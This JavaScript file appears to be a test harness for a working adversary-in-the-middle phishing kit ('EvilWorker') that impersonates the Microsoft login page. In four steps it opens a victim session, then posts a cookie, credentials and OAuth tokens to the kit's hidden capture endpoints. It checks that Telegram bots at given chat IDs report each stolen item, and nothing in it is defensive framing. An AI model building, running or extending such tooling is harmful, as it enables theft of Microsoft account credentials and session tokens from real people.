const https = require('https');
const { URL } = require('url');

const EVILWORKER_URL = 'https://evilworker-aitm-2025.azurewebsites.net';
const PHISHING_URL = `${EVILWORKER_URL}/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`;

console.log('🔔 TESTING TELEGRAM NOTIFICATIONS');
console.log('=====================================');
console.log('This test will trigger various events to verify Telegram notifications.\n');

function makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const requestOptions = {
            hostname: urlObj.hostname,
            port: 443,
            path: urlObj.pathname + urlObj.search,
            method: options.method || 'GET',
            headers: options.headers || {},
            rejectUnauthorized: false
        };

        const req = https.request(requestOptions, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    headers: res.headers,
                    body: data
                });
            });
        });

        req.on('error', reject);
        if (options.body) {
            req.write(options.body);
        }
        req.end();
    });
}

async function testTelegramNotifications() {
    console.log('📱 Step 1: Testing NEW VICTIM SESSION notification');
    console.log('   Accessing phishing URL to create new session...');
    
    const step1 = await makeRequest(PHISHING_URL);
    const sessionCookie = step1.headers['set-cookie']?.[0]?.split(';')[0];
    
    if (sessionCookie) {
        console.log('   ✅ Session created:', sessionCookie);
        console.log('   ⏳ Check Telegram for NEW VICTIM SESSION notification\n');
    } else {
        console.log('   ❌ Failed to create session\n');
        return;
    }
    
    // Wait a bit for notification to be sent
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    console.log('🍪 Step 2: Testing COOKIE CAPTURED notification');
    console.log('   Simulating cookie capture...');
    
    // Simulate a cookie being set via the JSCookie endpoint
    const cookieData = 'test_cookie=test_value_12345; domain=.microsoft.com; path=/; secure';
    const step2 = await makeRequest(`${EVILWORKER_URL}/JSCookie_6X7dRqLg90mH`, {
        method: 'POST',
        headers: {
            'Cookie': sessionCookie,
            'Content-Type': 'text/plain'
        },
        body: cookieData
    });
    
    console.log('   Response:', step2.statusCode);
    console.log('   ⏳ Check Telegram for COOKIE CAPTURED notification\n');
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    console.log('🔐 Step 3: Testing CREDENTIALS CAPTURED notification');
    console.log('   Simulating login request...');
    
    // Simulate a login request through the proxy
    const loginRequest = {
        url: 'https://login.microsoftonline.com/common/login',
        method: 'POST',
        headers: {
            host: 'login.microsoftonline.com',
            'content-type': 'application/x-www-form-urlencoded'
        },
        body: 'username=testuser@example.com&password=TestPassword123!&grant_type=password',
        referrer: '',
        mode: 'cors'
    };
    
    const step3 = await makeRequest(`${EVILWORKER_URL}/lNv1pC9AWPUY4gbidyBO`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Cookie': sessionCookie
        },
        body: JSON.stringify(loginRequest)
    });
    
    console.log('   Response:', step3.statusCode);
    console.log('   ⏳ Check Telegram for CREDENTIALS CAPTURED notification\n');
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    console.log('🔑 Step 4: Testing OAUTH TOKEN CAPTURED notification');
    console.log('   Simulating OAuth token request...');
    
    // Simulate an OAuth token request
    const tokenRequest = {
        url: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
        method: 'POST',
        headers: {
            host: 'login.microsoftonline.com',
            'content-type': 'application/x-www-form-urlencoded'
        },
        body: 'grant_type=authorization_code&code=0.AVAAEXQGYGKibUyHNBYbWlrHX1tURUdmxrBJg-YdOT51J2yhAPA.AQABAAIAAAD&access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFq&id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Im5PbzNaRHJPRFhFSzFq',
        referrer: '',
        mode: 'cors'
    };
    
    const step4 = await makeRequest(`${EVILWORKER_URL}/lNv1pC9AWPUY4gbidyBO`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Cookie': sessionCookie
        },
        body: JSON.stringify(tokenRequest)
    });
    
    console.log('   Response:', step4.statusCode);
    console.log('   ⏳ Check Telegram for OAUTH TOKEN CAPTURED notification\n');
    
    console.log('📊 SUMMARY');
    console.log('==========');
    console.log('Test completed! You should have received the following Telegram notifications:');
    console.log('1. 🎣 NEW VICTIM SESSION - When the phishing link was accessed');
    console.log('2. 🍪 COOKIE CAPTURED - When the cookie was sent');
    console.log('3. 🔐 CREDENTIALS CAPTURED - When login credentials were submitted');
    console.log('4. 🔑 OAUTH TOKEN CAPTURED - When OAuth tokens were captured');
    console.log('');
    console.log('Check both Telegram bots:');
    console.log('- Bot 1: Chat ID 6743632244');
    console.log('- Bot 2: Chat ID 6263177378');
    console.log('');
    console.log('If you didn\'t receive notifications, check:');
    console.log('- The bot tokens are valid');
    console.log('- The chat IDs are correct');
    console.log('- The bots have permission to send messages to the chats');
}

testTelegramNotifications().catch(console.error);